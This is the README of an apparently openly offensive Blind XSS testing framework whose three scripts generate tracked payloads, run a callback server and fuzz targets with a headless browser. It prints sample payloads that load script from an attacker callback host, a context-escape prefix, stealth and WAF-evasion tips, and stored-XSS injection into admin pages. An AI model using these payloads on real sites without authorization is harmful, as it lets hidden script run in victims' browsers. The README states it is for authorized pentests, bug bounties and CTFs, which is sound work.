# 🎯 Blind XSS Testing Framework

**A comprehensive 3-script framework for testing Blind XSS vulnerabilities with payload generation, callback tracking, and automated browser-based fuzzing.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Workflow](#-workflow)
- [Installation](#-installation)
- [Scripts](#-scripts)
  - [1. blind_xss_generate.py](#1-blind_xss_generatepy)
  - [2. callback_server.py](#2-callback_serverpy)
  - [3. auto_xss_test.py](#3-auto_xss_testpy)

- [Quick Start](#-quick-start)
- [Advanced Usage](#-advanced-usage)
- [How It Works](#-how-it-works)
- [Troubleshooting](#-troubleshooting)

---

## 🌟 Overview

This framework provides an end-to-end solution for testing **Blind XSS** vulnerabilities:

1. **Generate** hundreds of XSS payloads with unique tracking IDs
2. **Listen** for callbacks when payloads execute (even if you don't see the page)
3. **Automate** testing with headless browser + multi-threading support

**Key Features:**
- ✅ **1000+** bypass payloads (base64, obfuscation, polyglots, event handlers)
- ✅ **Automatic tracking** - Know exactly which payload worked via unique IDs
- ✅ **Multi-threaded fuzzing** - 1-10 threads (default: 1 for stealth, max: 10 for safety)
- ✅ **Auto-sorted results** - All output files organized by payload ID
- ✅ **Smart folder management** - Auto-creates folders, organizes logs
- ✅ **Runtime ID tags** - Clear `[ID N]` markers in multi-threading output
- ✅ **First-order & Second-order XSS** detection
- ✅ **CTF mode** - Prevent spam from repeated hits
- ✅ **3 encoding formats** - URL, Form, JSON

---

## 🔄 Workflow

```
STEP 1: Generate Payloads
-> run 1_blind_xss_generate.py

STEP 2: Start Callback Server
-> run 2_callback_server.py

STEP 3: Capture request via burpsuite

STEP 4: Run Automated Testing
-> Run 3_blind_xss_auto_test.py

STEP 5: Monitor
1. Callback server 
2. Output from --result (xss_hits.log + result/findings.txt)
```

---

## 🛠️ Installation

### Requirements
- Python 3.6+
- Firefox browser
- geckodriver (Firefox WebDriver)

### Install Dependencies

```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install -y firefox firefox-geckodriver
pip3 install selenium

# macOS
brew install geckodriver
pip3 install selenium

# Windows
# Download geckodriver from: https://github.com/mozilla/geckodriver/releases
# Add to PATH
pip install selenium
```

### Setup SSL Certificates (for callback_server.py)

```bash
# Create ssl-certs directory
mkdir ssl-certs

# Option 1: Use Let's Encrypt (recommended)
sudo certbot certonly --standalone -d your-domain.com
sudo cp /etc/letsencrypt/live/your-domain.com/fullchain.pem ssl-certs/your-domain.com.cer
sudo cp /etc/letsencrypt/live/your-domain.com/privkey.pem ssl-certs/your-domain.com.key

# Option 2: Self-signed certificate (for testing)
openssl req -x509 -newkey rsa:4096 -keyout ssl-certs/your-domain.com.key \
  -out ssl-certs/your-domain.com.cer -days 365 -nodes \
  -subj "/CN=your-domain.com"
```

---
## 📜 Scripts

### 1. **blind_xss_generate.py**

**Purpose:** Generate comprehensive XSS payload wordlists with tracking IDs

**What it does:**
- Creates 1000+ XSS payloads (script tags, event handlers, SVG, polyglots, etc.)
- Each payload has a unique `?id=N` parameter for tracking
- Generates 3 wordlist files with different encodings:
  - `www_input_payloads.txt` - Raw (for POST form-urlencoded)
  - `url_payloads.txt` - URL encoded (for GET parameters)
  - `json_input_payloads.txt` - JSON escaped (for POST JSON)

**Usage:**
```bash
# Basic usage
python3 blind_xss_generate.py --server https://your-server.com --file /hook.js

# Custom output directory
python3 blind_xss_generate.py \
  --server https://abc123.ngrok.io \
  --file /hook.js \
  --output ./my_payloads
```

**Arguments:**
- `--server` - Your callback server URL (e.g., `https://your-server.com`)
- `--file` - Payload file path on server (default: `/x.js`)
- `--output` - Output directory (default: `./wordlists`)

**Output:**
```
wordlists/
├── www_input_payloads.txt    # For POST form-urlencoded
├── url_payloads.txt          # For GET URL parameters
├── json_input_payloads.txt   # For POST JSON
└── payloads_analysis.txt     # Analysis report
```

---

### 2. **callback_server.py**

**Purpose:** HTTP/HTTPS server to receive and track XSS callbacks

**What it does:**
- Listens on ports 80 (HTTP) and 443 (HTTPS)
- Detects `?id=N` parameter in incoming requests
- Maps payload ID to original payload from wordlist
- Displays beautiful colored output when XSS triggers
- Saves working payloads to result file
- **CTF Mode:** Limits hits per payload to prevent spam

**Usage:**
```bash
# Normal mode (unlimited hits)
sudo python3 callback_server.py \
  --domain your-server.com \
  --cert-dir ./ssl-certs \
  --result working.txt

# CTF mode (max 3 hits per payload)
sudo python3 callback_server.py \
  --domain your-server.com \
  --cert-dir ./ssl-certs \
  --result working.txt \
  --ctf-mode --max-hits 3

# HTTP only (for testing)
sudo python3 callback_server.py --http-only --http-port 8080
```

**Arguments:**
- `--domain` - Your domain name (e.g., `your-server.com`)
- `--cert-dir` - SSL certificate directory (default: `./ssl-certs`)
- `--result` - Save working payloads to file (e.g., `result/working.txt`, auto-creates folder)
- `--wordlist` - Wordlist path (default: `wordlists/www_input_payloads.txt`)
- `--ctf-mode` - Enable CTF mode (limit hits per payload)
- `--max-hits` - Max hits per payload in CTF mode (default: 3)
- `--http-only` / `--https-only` - Run only HTTP or HTTPS
- `--http-port` / `--https-port` - Custom ports

**Output Files:**
- Result file: `--result` path (e.g., `result/working.txt`)
- Log file: Same folder as result file (e.g., `result/xss_hits.log`)
- Both files **auto-sorted by ID** on server shutdown (Ctrl+C)

**SSL Certificate Setup:**
```bash
# Place your SSL files in ./ssl-certs/:
ssl-certs/
├── your-domain.com.cer  # or .crt
├── your-domain.com.key
└── ca.cer               # (optional - will auto-merge)
```

**Output Example:**
```
======================================================================
🎯 XSS PAYLOAD HIT!
======================================================================
Time:       2025-10-21 14:32:15
Payload ID: 123
From IP:    203.0.113.45
Protocol:   HTTPS
Path:       /x.js?id=123
Referer:    https://target.com/search?q=test...
Payload:    <img src=x onerror="var s=document.createElement('scri...
======================================================================
💡 Find payload: sed -n '123p' wordlists/www_input_payloads.txt
======================================================================

On shutdown (Ctrl+C):
Sorting files by ID...
✓ Sorted result file by ID: result/working.txt
✓ Sorted log file by ID: result/xss_hits.log
✓ Done
```

---

### 3. **auto_xss_test.py**

**Purpose:** Automated XSS testing with headless browser

**What it does:**
- Loads payloads from wordlist and injects them into target
- Uses real browser (Firefox headless) to execute JavaScript
- Detects XSS through multiple methods:
  - **HTML Reflection** - Payload in HTML source
  - **DOM Execution** - Performance API detects callback request
  - **Script Tag Injection** - Script tag found in DOM
- Supports GET, POST (form/JSON), and multi-threading
- **Second-order XSS** detection (stored XSS on different page)
- Automatically triggers events (hover, click) to activate payloads

**Usage:**
```bash
# GET request (use URL encoded wordlist)
python3 auto_xss_test.py \
  --request burp_get.txt \
  --wordlist wordlists/url_payloads.txt \
  --threads 5

# POST form-urlencoded
python3 auto_xss_test.py \
  --request burp_post_form.txt \
  --wordlist wordlists/www_input_payloads.txt \
  --threads 5

# POST JSON
python3 auto_xss_test.py \
  --request burp_post_json.txt \
  --wordlist wordlists/json_input_payloads.txt \
  --threads 5

# Fast mode (10 threads, 1s delay)
python3 auto_xss_test.py \
  --request burp.txt \
  --wordlist wordlists/www_input_payloads.txt \
  --threads 10 --delay 1

# With second-order XSS detection
python3 auto_xss_test.py \
  --request burp_post.txt \
  --second-order burp_display.txt \
  --wordlist wordlists/www_input_payloads.txt

# Single-threaded with visible browser (debugging)
python3 auto_xss_test.py \
  --request burp.txt \
  --wordlist wordlists/www_input_payloads.txt \
  --threads 1 --no-headless
```

**Arguments:**
- `--request` - HTTP request file (Burp Suite format) with `FUZZ` marker
- `--target` - Alternative: Direct URL with `FUZZ` (e.g., `https://target.com/search?q=FUZZ`)
- `--wordlist` - Payload wordlist (default: `wordlists/www_input_payloads.txt`)
- `--threads` - Number of concurrent threads (default: 1, max: 10)
- `--delay` - Delay in seconds after loading each page (default: 3)
- `--output` - Output file for findings (default: `result/findings.txt`, auto-creates folder)
- `--second-order` - Second-order request file for stored XSS detection
- `--server` - Callback server URL (auto-detected from wordlist if not specified)
- `--no-headless` - Show browser window (debugging, single-threaded only)

**Request File Format (copy from Burp Suite):**
```http
POST /api/comment HTTP/2
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"comment":"FUZZ","author":"test"}
```

**Second-Order File Format:**
```http
GET /user/profile HTTP/1.1
Host: target.com
Cookie: session=abc123

(No FUZZ marker - just the page where stored payload might appear)
```

**Output:**
- `result/findings.txt` - Detected XSS (via source analysis, auto-sorted by ID)
- Check `callback_server.py` for confirmed callbacks

**Features:**
- ✅ **Auto-sort by ID** - Results sorted by payload ID for easy review
- ✅ **Runtime ID tags** - All detections show `[ID N]` for multi-threading clarity
- ✅ **Auto-folder creation** - Output folder automatically created
- ✅ **Max 10 threads** - System resource protection

**Runtime Output Example (Multi-threading):**
```
[5] Testing payload ID 5...
    Payload: <svg onload=...
    ℹ [ID 5] Payload NOT detected in any form
    Waiting 3s for callback...
    ✓ Done

[6] Testing payload ID 6...
    Payload: <iframe src=...
    🎯 [ID 6] DOM-BASED XSS [CONFIRMED]    # ← Clear ID tag!
    ✓ Execution DETECTED via browser
    ✓ Resource load to callback server detected
    Triggering events...
    Waiting 3s for callback...
    ✓ Done

Sorting results by ID...
✓ Sorted findings by ID: result/findings.txt
```

## 🚀 Quick Start

### Complete Example - Testing a Target Site

```bash
# 1. Generate payloads
python3 blind_xss_generate.py \
  --server https://your-server.com \
  --file /x.js

# 2. Start callback server (in separate terminal)
sudo python3 callback_server.py \
  --domain your-server.com \
  --cert-dir ./ssl-certs \
  --result result/working.txt \
  --ctf-mode

# 3. Create Burp request file (burp.txt)
cat > burp.txt << 'EOF'
POST /api/comment HTTP/2
Host: target.com
Cookie: session=abc123
Content-Type: application/json

{"comment":"FUZZ","author":"test"}
EOF

# 4. Run automated testing (default 1 thread, use --threads 5 for speed)
python3 auto_xss_test.py \
  --request burp.txt \
  --wordlist wordlists/json_input_payloads.txt \
  --threads 5

# 5. Watch callback server for hits!
# Results will be in:
# - result/working.txt (confirmed payloads)
# - result/findings.txt (browser-detected XSS)
# - result/xss_hits.log (all callback hits)
# All files auto-sorted by ID!
```

### Using ngrok (No Server Needed)

```bash
# 1. Start ngrok
ngrok http 80

# 2. Use ngrok URL in payloads
python3 blind_xss_generate.py \
  --server https://abc123.ngrok.io \
  --file /x.js

# 3. Start callback server (HTTP only)
python3 callback_server.py \
  --http-only \
  --http-port 80 \
  --result working.txt

# 4. Test normally
python3 auto_xss_test.py \
  --request burp.txt \
  --wordlist wordlists/www_input_payloads.txt
```

---

## 🔧 Advanced Usage

### CTF Mode (Prevent Spam)

When testing CTF challenges, enable CTF mode to limit hits per payload:

```bash
sudo python3 callback_server.py \
  --domain your-server.com \
  --cert-dir ./ssl-certs \
  --ctf-mode --max-hits 3
```

**Behavior:**
- First hit: Logs payload
- Second hit: Logs again
- Third hit: Logs with `[CONFIRMED]` tag
- Future hits: Silently rejected (no spam)

### Second-Order XSS Testing

Test for stored XSS that appears on a different page:

```bash
# Create second-order request file (burp_display.txt)
cat > burp_display.txt << 'EOF'
GET /admin/comments HTTP/1.1
Host: target.com
Cookie: session=admin_token
EOF

# Run test
python3 auto_xss_test.py \
  --request burp_post.txt \
  --second-order burp_display.txt \
  --wordlist wordlists/www_input_payloads.txt
```

**How it works:**
1. Injects payload via `burp_post.txt` (e.g., POST to `/api/comment`)
2. Checks for reflection on same page (first-order)
3. Navigates to `burp_display.txt` (e.g., GET `/admin/comments`)
4. Checks if payload appears there (second-order/stored)

### Multi-Threading Performance

```bash
# Default (1 thread) - stealthy, careful
python3 auto_xss_test.py --request burp.txt

# Balanced (5 threads) - recommended for speed
python3 auto_xss_test.py --request burp.txt --threads 5

# Fast (10 threads - MAXIMUM) - may trigger WAF/rate limiting
python3 auto_xss_test.py --request burp.txt --threads 10 --delay 1
```

**Performance:**
- 1 thread (default): ~20 payloads/min (stealthy, safe)
- 5 threads: ~100 payloads/min (balanced, recommended)
- 10 threads (max): ~200 payloads/min (fast, aggressive)

**Note:** Maximum 10 threads enforced to prevent system resource exhaustion. Attempting more will auto-cap at 10 with a warning.

### Choosing the Right Wordlist

| Request Type | Content-Type | Wordlist to Use |
|-------------|--------------|-----------------|
| GET parameter | N/A | `url_payloads.txt` |
| POST form | `application/x-www-form-urlencoded` | `www_input_payloads.txt` |
| POST JSON | `application/json` | `json_input_payloads.txt` |
| POST XML/other | any | `www_input_payloads.txt` |

---

## 💡 How It Works

### Payload Tracking System

1. **Generation Phase:**
   ```python
   # blind_xss_generate.py generates:
   <script src="https://your-server.com/x.js?id=1"></script>   # Payload 1
   <script src="https://your-server.com/x.js?id=2"></script>   # Payload 2
   <script src="https://your-server.com/x.js?id=3"></script>   # Payload 3
   ...
   ```

2. **Testing Phase:**
   ```
   auto_xss_test.py injects payload 123 → Target reflects it → Browser executes it
   → Browser requests: https://your-server.com/x.js?id=123
   ```

3. **Callback Phase:**
   ```
   callback_server.py receives: GET /x.js?id=123
   → Reads line 123 from wordlist
   → Displays: "Payload ID 123 worked! <script src=...>"
   ```

### Detection Methods

**auto_xss_test.py** uses 4 detection methods:

1. **HTML Reflection** - Payload found in HTML source (not escaped)
   ```
   ✓ Reliable indicator of XSS
   ```

2. **DOM Execution** - Performance API detects callback request
   ```javascript
   performance.getEntriesByType('resource')
     .some(r => r.name.includes('your-server.com'))
   ```

3. **Script Tag Injection** - Script tag with callback URL in DOM
   ```javascript
   document.getElementsByTagName('script')
     .some(s => s.src.includes('your-server.com'))
   ```

4. **URL Injection** - Payload in URL but not in HTML (potential DOM-based)
   ```
   ℹ May execute later or need interaction
   ```

### Callback Flow

```
┌──────────────┐         ┌──────────────┐         ┌──────────────┐
│   Browser    │────①───→│ Target Site  │────②───→│   Browser    │
│ (auto_xss)   │ Inject  │              │ Reflect │ (auto_xss)   │
└──────────────┘ Payload └──────────────┘ Payload └──────────────┘
                                                        │
                                                        │ ③ Execute
                                                        ↓
                                                   ┌──────────────┐
                                                   │ Callback     │
                                                   │ Server       │
                                                   │ (callback_   │
                                                   │  server.py)  │
                                                   └──────────────┘
```

---

## 🐛 Troubleshooting

### Issue: "Cannot reach callback server"

**Cause:** `auto_xss_test.py` cannot connect to callback server

**Solution:**
```bash
# Make sure callback server is running
sudo python3 callback_server.py --domain your-server.com --cert-dir ./ssl-certs

# Check firewall (allow ports 80/443)
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Test connectivity
curl -I https://your-server.com
```

### Issue: "SSL certificate files not found"

**Cause:** Missing SSL certificates in `ssl-certs/`

**Solution:**
```bash
# Check certificate files
ls -la ssl-certs/

# Should have:
# your-domain.com.cer (or .crt)
# your-domain.com.key

# Use self-signed cert for testing
openssl req -x509 -newkey rsa:4096 \
  -keyout ssl-certs/your-domain.com.key \
  -out ssl-certs/your-domain.com.cer \
  -days 365 -nodes -subj "/CN=your-domain.com"
```

### Issue: "Payload ID mapping incorrect"

**Cause:** Old version of `callback_server.py` had bug with comment lines

**Solution:**
- **Fixed in latest version!** The bug where payload IDs were mapped to line numbers (including comments) has been resolved. The server now correctly counts only payload lines.

### Issue: "Browser failed to initialize"

**Cause:** Missing geckodriver or Firefox

**Solution:**
```bash
# Ubuntu/Debian
sudo apt-get install firefox firefox-geckodriver

# macOS
brew install geckodriver

# Verify installation
which geckodriver
firefox --version
```

### Issue: "Too many threads cause errors"

**Cause:** System resource limits

**Solution:**
```bash
# Reduce thread count
python3 auto_xss_test.py --request burp.txt --threads 3

# Increase delay
python3 auto_xss_test.py --request burp.txt --threads 5 --delay 5

# Use single-threaded mode
python3 auto_xss_test.py --request burp.txt --threads 1
```

### Issue: "No XSS detected but payloads work"

**Possible causes:**
1. Callback server not running → Start `callback_server.py`
2. Delay too short → Increase `--delay` to 5+ seconds
3. Auto-trigger payloads need interaction → Check `callback_server.py` logs
4. DOM-based XSS on client-side → Callback will still fire even if not in HTML

**Debugging:**
```bash
# Use visible browser to see what happens
python3 auto_xss_test.py \
  --request burp.txt \
  --wordlist wordlists/www_input_payloads.txt \
  --threads 1 --no-headless --delay 10

# Monitor callback server logs in real-time
tail -f result/xss_hits.log

# Or if using default location
tail -f xss_hits.log
```

### Issue: "Where are my output files?"

**Answer:** All output files are organized in folders:

```bash
# Default structure (with --result result/working.txt):
result/
├── working.txt      # Confirmed working payloads (from callback_server.py)
├── findings.txt     # Browser-detected XSS (from auto_xss_test.py)
└── xss_hits.log     # All callback hits log

# All files automatically sorted by payload ID!
```

**Custom folder:**
```bash
# Using custom path
python3 callback_server.py --result ctf/challenge1/working.txt

# Output structure:
ctf/challenge1/
├── working.txt
└── xss_hits.log

# auto_xss_test.py can use different folder
python3 auto_xss_test.py --output ctf/challenge1/findings.txt
```

---

## 📝 Notes

### Payload Structure

Each wordlist contains 4 sections:

1. **Section 1:** Raw payloads (no escape)
2. **Section 2:** Prefix + `<!--` suffix (HTML comment)
3. **Section 3:** Prefix + `//` suffix (JS comment)
4. **Section 4:** Prefix + `<!--//` suffix (HTML+JS combo)

**Prefix:** `'";`--></sCrIpT></sTyLe></tExTaReA>...` (context escape)

### Best Practices

1. **Always start callback server first** before running tests
2. **Use CTF mode** when testing CTF challenges to prevent spam
3. **Choose correct wordlist** based on request type (GET/POST form/POST JSON)
4. **Start with 1 thread** (default, stealthy), use 5+ threads for speed
5. **Max 10 threads** enforced - don't exceed system limits
6. **Check sorted output files** - Results organized by ID for easy review
7. **Check both `auto_xss_test.py` output AND `callback_server.py` logs** for complete results
8. **Use second-order testing** when testing stored XSS scenarios
9. **Review sorted logs** - `result/findings.txt` and `result/xss_hits.log` sorted by ID on completion

### Security Considerations

- This tool is for **authorized testing only** (bug bounties, CTFs, pentests)
- Always have **written permission** before testing
- Some payloads may trigger **WAF/IDS** - use responsibly
- **CTF mode** prevents spam but may miss edge cases

---

## 📊 Summary

| Script | Purpose | Input | Output |
|--------|---------|-------|--------|
| `blind_xss_generate.py` | Generate payloads | Server URL | Wordlists (3 files) |
| `callback_server.py` | Receive callbacks | Wordlist + SSL cert | `result/working.txt` + `result/xss_hits.log` (sorted) |
| `auto_xss_test.py` | Automated testing | Request file + Wordlist | `result/findings.txt` (sorted) |

**Workflow:** Generate → Listen → Test → Analyze

**Detection:** Browser-based (HTML + DOM) + Callback server confirmation

**Result:** Know exactly which payload worked via tracking ID

**New Features:**
- ✅ Default 1 thread (stealthy), max 10 threads (safe)
- ✅ Auto-folder creation (`result/` by default)
- ✅ Auto-sorted output files by payload ID
- ✅ Runtime `[ID]` tags for clarity in multi-threading
- ✅ Log files organized in same folder as results

---

## 🎓 Examples

### Example 1: Basic Blind XSS Test

```bash
# 1. Generate
python3 blind_xss_generate.py --server https://your-server.com

# 2. Listen
sudo python3 callback_server.py \
  --domain your-server.com \
  --cert-dir ./ssl-certs \
  --result result/working.txt

# 3. Test (default: 1 thread, output to result/findings.txt)
python3 auto_xss_test.py --request burp.txt --wordlist wordlists/www_input_payloads.txt

# 4. Check results (all sorted by ID)
cat result/working.txt    # Confirmed working payloads
cat result/xss_hits.log   # All hits log
cat result/findings.txt   # Browser-detected XSS
```

### Example 2: CTF Challenge (Fast Mode)

```bash
# Generate with ngrok
python3 blind_xss_generate.py --server https://abc123.ngrok.io

# Listen with CTF mode
python3 callback_server.py --http-only --ctf-mode --max-hits 3

# Test with high threads
python3 auto_xss_test.py --request burp.txt --threads 10 --delay 1
```

### Example 3: Second-Order Stored XSS

```bash
# Generate
python3 blind_xss_generate.py --server https://your-server.com

# Listen
sudo python3 callback_server.py --domain your-server.com --cert-dir ./ssl-certs

# Test with second-order
python3 auto_xss_test.py \
  --request burp_post_comment.txt \
  --second-order burp_view_comments.txt \
  --wordlist wordlists/www_input_payloads.txt
```

---

## 📄 License

This tool is for **educational and authorized security testing only**.

**Use responsibly. Happy hunting! 🎯**
